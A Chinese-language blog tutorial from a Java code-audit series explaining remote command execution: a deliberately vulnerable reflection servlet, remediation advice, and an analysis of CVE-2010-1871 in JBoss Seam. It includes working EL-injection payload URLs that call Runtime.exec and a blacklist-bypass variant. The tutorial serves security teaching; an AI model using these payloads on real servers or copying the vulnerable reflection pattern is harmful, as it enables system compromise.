# 【Java 代码审计入门-05】RCE 漏洞原理与实际案例介绍

## 0x00 写在前面

为什么会有这一些列的文章呢？因为我发现网上没有成系列的文章或者教程，基本上是 Java 代码审计中某个点来阐述的，对于新人来说可能不是那么友好，加上本人也在学习 Java 审计，想做个学习历程的记录和总结，因此有了本系列的文章。

本系列的文章面向人群主要是**拥有 Java 基本语法基础的朋友**，系列文章的内容主要包括，审计环境介绍、SQL 漏洞原理与实际案例介绍、XSS 漏洞原理与实际案例介绍、SSRF 漏洞原理与实际案例介绍、RCE 漏洞原理与实际案例介绍、包含漏洞原理与实际案例介绍、序列化漏洞原理与实际案例介绍、S2系列经典漏洞分析、WebLogic 系列经典漏洞分析、fastjson系列经典漏洞分析、jackson系列经典漏洞分析等，可能内容顺序会略有调整，但是总体内容不会改变，最后希望这系列的文章能够给你带来一点收获。

目前已完成内容如下：

【Java 代码审计入门-01】审计前的准备 https://www.cnpanda.net/codeaudit/588.html

【Java 代码审计入门-02】SQL 漏洞原理与实际案例介绍 https://www.cnpanda.net/codeaudit/600.html

【Java 代码审计入门-03】XSS 漏洞原理与实际案例介绍 https://www.cnpanda.net/codeaudit/605.html

【Java 代码审计入门-04】SSRF 漏洞原理与实际案例介绍 https://www.cnpanda.net/codeaudit/678.html

## 0x01 前戏

下载 RCE 测试源码：

https://github.com/cn-panda/JavaCodeAudit

导入项目，可以得到以下目录：

![1.png](https://github.com/cn-panda/JavaCodeAudit/blob/master/%E3%80%9005%E3%80%91RCE%20%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E9%99%85%E6%A1%88%E4%BE%8B%E4%BB%8B%E7%BB%8D/img/1.png?raw=true)

项目是一个简单调用类方法去执行相关操作的实现。在 servlet 层接受到请求后，调用 rceTest中的CommandFound函数，该函数接受三个参数：command、method、str，command 为要执行的命令类，method 为要执行的方法，str 为要执行的内容。

本项目模拟用户从web 端向服务器发起添加、删除、修改等操作，该操作通过调用 Command 类中的AddCommand/DeletcCommand/ModifyCommand等方法，去实现请求。

## 0x02 漏洞原理

#### 1、RCE 漏洞的定义及原理

RCE 的中文名称是远程命令执行，指的是攻击者通过Web 端或客户端提交执行命令，由于服务器端没有针对执行函数做过滤或服务端存在逻辑漏洞，导致在没有指定绝对路径的情况下就可以执行命令。

RCE 漏洞的原理其实也很简单，就是通过开发人员没有针对代码中可执行的特殊函数或自定义方法入口做过滤，导致客户端可以提交恶意构造语句，并交由服务器端执行。常见的可执行函数如：`Runtime.exec()`，当然我们审计的时候，决不能只根据这个函数来，其他的审计点如：Process、`ProcessBuilder.start()`等也是很重要的内容。

#### 2、RCE 漏洞可能出现的场景

RCE 出现的场景比较多，如：

1、服务端直接存在可执行函数（`exec()`等），且对传入的参数过滤不严格导致 RCE 漏洞

2、服务端不直接存在可执行函数（`exec()`等），且对传入的参数过滤不严格导致 RCE 漏洞

3、由表达式注入导致的RCE漏洞，常见的如：OGNL、SpEL、MVEL、EL、Fel、JST+EL等

4、由java后端模板引擎注入导致的 RCE 漏洞，常见的如：Freemarker、Velocity、Thymeleaf等

5、由java一些脚本语言引起的 RCE 漏洞，常见的如：Groovy、JavascriptEngine等

6、由第三方开源组件引起的 RCE 漏洞，常见的如：Fastjson、Shiro、Xstream、Struts2、weblogic等

以上是RCE 漏洞出现比较频繁的场景，原理也有些许不同，有的是过滤不严格导致，有的是反序列化调用链导致，有的是特性导致，在这里仅对过滤不严格进行介绍，后两者会在后续的文章中逐一介绍。

#### 3、项目具体演示

拿上述项目举例，首先看看项目的具体实现：

![1.png](https://github.com/cn-panda/JavaCodeAudit/blob/master/%E3%80%9005%E3%80%91RCE%20%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E9%99%85%E6%A1%88%E4%BE%8B%E4%BB%8B%E7%BB%8D/img/2.png?raw=true)

command 为请求的类，method 为请求类的方法，str 为请求类的参数，服务端接收这三个参数后执行 method 的具体方法，如上图所示，首先找到 `com.sec.pojo.Command`类，然后找到该类中的`AddCommand`方法，最后根据这个方法的需要，传入指定的参数`[add]`。

![1.png](https://github.com/cn-panda/JavaCodeAudit/blob/master/%E3%80%9005%E3%80%91RCE%20%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E9%99%85%E6%A1%88%E4%BE%8B%E4%BB%8B%E7%BB%8D/img/3.png?raw=true)

项目的实现内容很简单，就是接收参数-->执行操作，下面我们来看这是怎么实现的。在`recTest.java`中，存在如下代码：

```java
public void CommandFound(HttpServletRequest req, HttpServletResponse resp) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, SecurityException, IllegalArgumentException, InvocationTargetException, IOException {
		// TODO Auto-generated method stub
		PrintWriter print = resp.getWriter();
		
  // 接收参数
		String name = req.getParameter("command");
		String method = req.getParameter("method");
		String str = req.getParameter("str");

  // 获取类的无参数构造方法
	    Class getCommandClass = Class.forName(name);
	    Constructor constructor = getCommandClass.getDeclaredConstructor();
	    constructor.setAccessible(true);
	// 实例化类
	    Object getInstance = constructor.newInstance();
	
  // 获取类方法
	    Method getCommandMethod = getCommandClass.getDeclaredMethod(method, String.class);
	    getCommandMethod.setAccessible(true);
  // 调用类方法
	    Object mes = getCommandMethod.invoke(getInstance, str);
	    
	    print.println("即将执行的操作指令：<br>");
	    print.println(mes);
	    print.flush();
	}
}
```

上段代码中，首先通过反射获取类名，再通过反射获取类方法并使用，这些利用的都是Java 的反射机制。java 的反射机制这里就不详细说明了，有兴趣的朋友可以看看我的这篇文章：https://www.cnpanda.net/codeaudit/705.html

有心的朋友可能发现了，上述代码中没有出现任何一个可执行函数（如exec()、system()等），但是却存在 RCE 漏洞。如下图所示：

![1.png](https://github.com/cn-panda/JavaCodeAudit/blob/master/%E3%80%9005%E3%80%91RCE%20%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E9%99%85%E6%A1%88%E4%BE%8B%E4%BB%8B%E7%BB%8D/img/4.png?raw=true)

可以发现，由于代码对于我们传入的类、传入类的方法、传入类的参数没有做任何限制，从而导致了 RCE 漏洞，这也是RCE 漏洞可能出现场景中的第二项。

实际上，现在由于反序列化的流行，RCE 漏洞也成为了常客出现在反序列化中，也正是这样，导致反射大量的运用，因为最终要一层层调用链去实现 RCE。

## 0x03 修复方案

由于命令执行所处的场景不同，因此修复的方式也要根据实际场景来。总的来说，需要注意以下几点：

1、禁止用户控制由程序执行的命令。如果用户的输入会影响程序原本的命令执行，那么应该设置一个安全白名单，使用户的输入变成从预定的安全命令集合中进行选择。若在用户的输入中检测出了非白名单中的命令，那么默认从安全命令集合中选择合适的命令给予替换，或者直接拒绝执行该命令。

2、如果需要将用户的输入用作程序命令中的参数，那么需要对用户的输入进行过滤，但实际场景过于复杂、参数难以追踪，导致这种过滤难度很大，在程序有选择的过滤潜在的危险字符时，只要攻击者的字符不在其黑名单内，那么应用程序受到攻击的概率将显著提高，所以更好的方法是组建一份白名单，允许其中的字符出现在输入中，并只接受完全由这些经认可的字符组成的输入，当然这种方案并不是完美的，有时候攻击者通过白名单内的字符组建绕过检测，同样可以达到攻击的目的，因此如何构建白名单、如果设置过滤机制是关键。

3、有时候攻击可以通过修改环境中的命令指令来达到攻击的效果，因此应该设置绝对路径来执行命令。

4、严格设置权限，有的时候我们所需执行命令仅需要很小的权限，如在上方示例代码中，如果我们不设置`setAccessible(true);`，那么攻击者就无法调用 `Runtime.exec()`命令。

## 0x04 实际案例（CVE-2010-1871）分析

#### 1、案例介绍

CVE 地址：https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1871

用于Red Hat Linux的JBoss企业应用程序平台4.3.0中使用的JBoss Seam 2（jboss-seam2）不能正确过滤JBoss表达式语言（EL）表达式的输入，这使远程攻击者可以通过精心制作的URL执行任意代码 。 

值得注意的是，在这个漏洞的CVE 介绍中提到：”仅当未正确配置Java安全管理器时，这才是漏洞。“但其实这个漏洞有两个不同的点，如下图，当我们在Metasploit中搜索 cve-2010-1871时：

![1.png](https://github.com/cn-panda/JavaCodeAudit/blob/master/%E3%80%9005%E3%80%91RCE%20%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E9%99%85%E6%A1%88%E4%BE%8B%E4%BB%8B%E7%BB%8D/img/5.png?raw=true)

存在两个exploit，首先看第一个`auxiliary/admin/http/jboss_seam_exec`的配置

![1.png](https://github.com/cn-panda/JavaCodeAudit/blob/master/%E3%80%9005%E3%80%91RCE%20%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E9%99%85%E6%A1%88%E4%BE%8B%E4%BB%8B%E7%BB%8D/img/7.png?raw=true)

这个 exploit 利用点在`/admin-console.login.seam`，当配置了java安全管理器后，该漏洞利用不成功。

本文中利用点为：`/seam-booking/home.seam`

#### 2、案例搭建

环境需求：`Ubuntu 18.04`、`jdk 1.6`、`ant 1.6`、`JBoss AS 5.0.1`、`JBoss-seam 2.2.0.CR1`

首先安装 jdk1.6，配置环境变量：

* `chmod u+x /usr/lib/jvm/java/jdk-6u45-linux-x64.bin` 为文件添加可执行权限
* ` ./jdk-6u45-linux-x64.bin`执行解压文件
* `mkdir -p /usr/lib/jvm/` 创建 jdk 存放文件夹
* `cp -r jdk1.6.0_45 /usr/lib/jvm/`将解压后的jdk文件放到刚才创建的文件夹中
* 安装`java/javac/javaws/jar`命令

```sh
update-alternatives --install /usr/bin/javac javac /usr/lib/jvm/jdk1.6.0_45/bin/javac 1
update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk1.6.0_45/bin/java 1
update-alternatives --install /usr/bin/javaws javaws /usr/lib/jvm/jdk1.6.0_45/bin/javaws 1
update-alternatives --install /usr/bin/jar jar /usr/lib/jvm/jdk1.6.0_45/bin/jar 1
update-alternatives --config javac
update-alternatives --config java
update-alternatives --config javaws
update-alternatives --config jar
```

* 执行`java -version`命令，若出现版本信息，则安装成功

配置 ant 1.6环境：

* 首先打开 profile 文件`sudo vim /etc/profile`

* 在文件尾部添加以下内容：

```shell
# 存放 ant 的目录路径
export ANT_HOME=/home/panda/www/ant
# 刚才安装的 jdk 目录路径
export JAVA_HOME=/usr/lib/jvm
# 下面默认
export PATH=$JAVA_HOME/bin:$PATH:$ANT_HOME/bin
export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar
```

上述环境变量配置完毕后，执行命令`source /etc/profile`刷新环境变量

配置 JBoss AS 5.0.1：

* 解压`jboss-5.0.1.GA.zip`
* 打开`/server/default/deploy/jbossweb.sar/server.xml`文件，搜索`${jboss.bind.address}`，将其改为`0.0.0.0`，如下所示：

```xml
<!-- A HTTP/1.1 Connector on port 8080 -->
      <Connector protocol="HTTP/1.1" port="8080" address="0.0.0.0" 
               connectionTimeout="20000" redirectPort="8443" />

      <!-- Add this option to the connector to avoid problems with 
          .NET clients that don't implement HTTP/1.1 correctly 
         restrictedUserAgents="^.*MS Web Services Client Protocol 1.1.4322.*$"
      -->

      <!-- A AJP 1.3 Connector on port 8009 -->
      <Connector protocol="AJP/1.3" port="8009" address="0.0.0.0"
         redirectPort="8443" />
```

安装`JBoss-seam 2.2.0.CR1`：

* 解压`JBoss-seam 2.2.0.CR1.zip`
* 将解压后的文件放在jboss 目录下，如下图所示：

![1.png](https://github.com/cn-panda/JavaCodeAudit/blob/master/%E3%80%9005%E3%80%91RCE%20%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E9%99%85%E6%A1%88%E4%BE%8B%E4%BB%8B%E7%BB%8D/img/8.png?raw=true)

* 进入`/jboss-seam`目录，编辑`build.properties`文件，在文件尾行加入以下代码：

```
# 该路径为 Jboss 的安装目录路径
jboss.home /home/panda/www/jboss
```

* 进入`jboss-seam/examples/booking`目录，然后执行安装命令：`ant deploy`，程序会自动安装，如下图所示：

![1.png](https://github.com/cn-panda/JavaCodeAudit/blob/master/%E3%80%9005%E3%80%91RCE%20%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E9%99%85%E6%A1%88%E4%BE%8B%E4%BB%8B%E7%BB%8D/img/9.png?raw=true)

安装完毕后在进入jboss 安装的根目录下的`bin`文件，执行`./run.sh`命令，如下图所示：

![1.png](https://github.com/cn-panda/JavaCodeAudit/blob/master/%E3%80%9005%E3%80%91RCE%20%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E9%99%85%E6%A1%88%E4%BE%8B%E4%BB%8B%E7%BB%8D/img/10.png?raw=true)

安装完毕后，在本机环境即可打开该站点，如下图所示：

![1.png](https://github.com/cn-panda/JavaCodeAudit/blob/master/%E3%80%9005%E3%80%91RCE%20%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E9%99%85%E6%A1%88%E4%BE%8B%E4%BB%8B%E7%BB%8D/img/11.png?raw=true)

![1.png](https://github.com/cn-panda/JavaCodeAudit/blob/master/%E3%80%9005%E3%80%91RCE%20%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E9%99%85%E6%A1%88%E4%BE%8B%E4%BB%8B%E7%BB%8D/img/13.png?raw=true)

在本目录下的/navigation/Pages.java 文件是漏洞的入口，关键代码如下：

```java
private static boolean callAction(FacesContext facesContext) {
     boolean result = false;   
  // 获取 HTTP 参数 actionOutcome 的值
     String outcome = (String)facesContext.getExternalContext().getRequestParameterMap().get("actionOutcome");
     String fromAction = outcome;   
     if (outcome == null) {
       
 		 // 获取 HTTP 参数 actionMethod 的值
		 String actionId = (String)facesContext.getExternalContext().getRequestParameterMap().get("actionMethod");      
     if (actionId != null) {
       
					if (!SafeActions.instance().isActionSafe(actionId)) 
            return result; 
					String expression = SafeActions.toAction(actionId);
					result = true;
					Expressions.MethodExpression actionExpression = Expressions.instance().createMethodExpression(expression);
					outcome = toString(actionExpression.invoke(new Object[0]));
       		fromAction = expression;
					handleOutcome(facesContext, outcome, fromAction);
       	}  
       
     } else {       
       handleOutcome(facesContext, outcome, fromAction);
    } 
      return result;
  }
```

获取参数，其中如果获取到 actionOutcome 参数，那么直接传入` handleOutcome` 函数中：

```java
// handleOutcome 方法
public static void handleOutcome(FacesContext facesContext, String outcome, String fromAction) {
     facesContext.getApplication().getNavigationHandler().handleNavigation(facesContext, fromAction, outcome); 
     Contexts.getPageContext().flush();
   }
```

直接调用`facesContext.getApplication().getNavigationHandler().handleNavigation()`

这句其实等价于我们常见的语句：`FacesContext.getCurrentInstance().getExternalContext().redirect()`

是 JSF中的导航处理，继续看` handleNavigation` 函数：

```java
//  handleNavigation 方法
public void handleNavigation(FacesContext context, String fromAction, String outcome) {
     if (!context.getResponseComplete())
     {
       if (isOutcomeViewId(outcome)) {        
         FacesManager.instance().interpolateAndRedirect(outcome);
       } else if (Init.instance().isJbpmInstalled() && Pageflow.instance().isInProcess() && Pageflow.instance().hasTransition(outcome)) {       
	        Pageflow.instance().navigate(context, outcome);
       } else if (!Pages.instance().navigate(context, fromAction, outcome)) {        
			     this.baseNavigationHandler.handleNavigation(context, fromAction, outcome);
       } 
    }
  }
```

如果为当前请求没有调用`responseComplete()`方法，则进一步传入`isOutcomeViewId()`方法进行判断：

```java
 // isOutcomeViewId() 方法
private static boolean isOutcomeViewId(String outcome) { 
   return (outcome != null && outcome.startsWith("/")); 
 }
```

若传入的参数不为空，并且以`/`开头，则进入`FacesManager.instance().interpolateAndRedirect()`方法，最后经过以下栈的调用进行了 JBoss EL 表达式的解析：

* interpolateAndRedirect (FacesManager.java)
* interpolate (Interpolator.java)
* interpolateExpressions (Interpolator.java)
* createValueExpression (Expressions.java)

整个漏洞流程如下图所示：

![1.png](https://github.com/cn-panda/JavaCodeAudit/blob/master/%E3%80%9005%E3%80%91RCE%20%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E9%99%85%E6%A1%88%E4%BE%8B%E4%BB%8B%E7%BB%8D/img/14.png?raw=true)

漏洞的逻辑线上面介绍的比较清楚了，下面的关键是如何构建我们想要的 JBoss EL 表达式。JBoss EL 表达式是在 Java EL 表达式基础上的增强。比如说我们想进行参数绑定，那么可以：

```jsp
<h:commandButton action="#{hotelBooking.bookHotel(hotel.id, user.username)}"value="Book Hotel"/>

```

如果想要进行参数值绑定，那么可以：

```java
#{person.name.length()}
// 使用length()方法返回一个字符串的长度
```

JBoss EL 解析器可以在JBoss EL语句中引用服务器端会话对象、会话对象的属性以及参数。在解析基础对象后，用户可以在该对象上调用任意方法。这样一来就使得我们可以通过反射的方式来访问其他任何类及其方法，如我们常用的`java.lang.Runtime`，我们可以通过下面的语句引用来`java.lang.Runtime`类：

```java
expressions.getClass().forName('java.lang.Runtime')
```

根据反射的基础知识，我们可以通过反射调用类后，来获取该类的单一方法或者所有方法。

如获取所有的方法：

```java
expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()
```

获取单一方法：

```java
expressions.getClass().forName('java.lang.Runtime').getDeclaredMethod('getRuntime')
```

执行命令：

```java
expressions.getClass().forName('java.lang.Runtime').getDeclaredMethod('getRuntime').invoke(expressions.getClass().forName('java.lang.Runtime')).exec('xxx')
```

这样整个 EL 表达式的最终效果就出来了：

```java
%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethod('getRuntime').invoke(expressions.getClass().forName('java.lang.Runtime')).exec('xxx')}
```

结合上面的一些函数要求：

* 要有`actionOutcome`参数

* `actionOutcome`参数要以`/`开头
* 要有目的导航地址
* 要含有`?`符号
* `
  ?`符号后要有参数
* EL 表达式要在`?参数=`的后面

综上，payload 最终如下：

```http
/seam-booking/home.seam?actionOutcome=/test.xhtml?canshu=%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethod('getRuntime').invoke(expressions.getClass().forName('java.lang.Runtime')).exec('gnome-calculator')}
```

访问后，会返回：

```http
/seam-booking/test.seam?canshu=java.lang.UNIXProcess%40ef99e17&cid=118
```

执行效果如下：

![1.png](https://github.com/cn-panda/JavaCodeAudit/blob/master/%E3%80%9005%E3%80%91RCE%20%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E9%99%85%E6%A1%88%E4%BE%8B%E4%BB%8B%E7%BB%8D/img/15.png?raw=true)

网上也有其他形式的 payload，首先使用`getDeclaredMethods()`得到所有方法，然后采用数组的形式调用指定方法。

假设我们想知道`java.lang.Runtime.getRuntime()`的方法是多少序号，那么可以尝试访问：

```http
/seam-booking/home.seam?actionOutcome=/test.xhtml?xxx=%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[0]}
```

![1.png](https://github.com/cn-panda/JavaCodeAudit/blob/master/%E3%80%9005%E3%80%91RCE%20%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E9%99%85%E6%A1%88%E4%BE%8B%E4%BB%8B%E7%BB%8D/img/16.png?raw=true)

返回的是：

```http
/seam-booking/test.seam?xxx=public+void+java.lang.Runtime.exit%28int%29&cid=143
```

明显不是我们想要的`java.lang.Runtime()`，可以继续尝试`getDeclaredMethods()[1]`

最终得到结果如下：

`getDeclaredMethods()[6]`等价于`java.lang.Runtime.getRuntime.exec()`

`getDeclaredMethods()[13]`等价于`java.lang.Runtime.getRuntime()`

因此最后的 payload 就为：

```http
/seam-booking/home.seam?actionOutcome=/test.xhtml?canshu=%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[13].invoke(expressions.getClass().forName('java.lang.R
untime').getDeclaredMethods()[6].invoke(null), 'gnome-calculator')}
```

执行效果：

![1.png](https://github.com/cn-panda/JavaCodeAudit/blob/master/%E3%80%9005%E3%80%91RCE%20%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E9%99%85%E6%A1%88%E4%BE%8B%E4%BB%8B%E7%BB%8D/img/17.png?raw=true)



#### 4、修复方案

针对于本漏洞，官方修了两次

https://securitytracker.com/id?1024253

https://securitytracker.com/id/1028601

第一次是对`actionOutcome`中检查是否包含`#{`等字符做了检查，这样完全使得 EL 表达式不能通过 http 传参的方式传入解析。第二次是对另一个参数`actionId`的修复，这里简单说下这个漏洞。

Seam 2.2.2.Final以后， JBoss创建了一个黑名单，`/src/main/org/jboss/seam/blacklist.properties`，针对以下内容进行了过滤：

```
.getClass()
.addRole(
.getPassword(
.removeRole(
```

但是依旧被绕过了，可以使用类似数组的运算符来处理黑名单模式（此处方法来自于 orange大神的思路：[点此访问](http://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html)，本人未经过验证，有兴趣可以试一试）：
把

```java
"".getClass().forName("java.lang.Runtime")
```

改成

```java
""["class"].forName("java.lang.Runtime")
```

因为JBoss Seam 只能在 JBoss EAP 7 下使用，而JBoss EAP 也在2016/11月停止维护，所以现在 JBoss Seam 受到的风险很高（因为忽略了一些安全人员提交的漏洞以及依旧在使用不是最新版本的第三方函数库）

## 0x05 总结

代码审计重要的是实际去做，去尝试，所以在动手研究、分析和复现后，收获是巨大的，本文的所有安装包及相关程序以及上传至项目文件，有兴趣的朋友可以自己下载去复现。

## 0x06 参考

https://cloud.tencent.com/developer/article/1547286

https://www.cnblogs.com/jayus/p/11435116.html

http://blog.o0o.nu/2010/07/cve-2010-1871-jboss-seam-framework.html

https://docs.huihoo.com/jboss/seam/2.0.0.GA/reference/zh-cn/elenhancements.html

https://www.anquanke.com/post/id/156078

https://blog.orange.tw/2016/12/java-web.html

http://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html

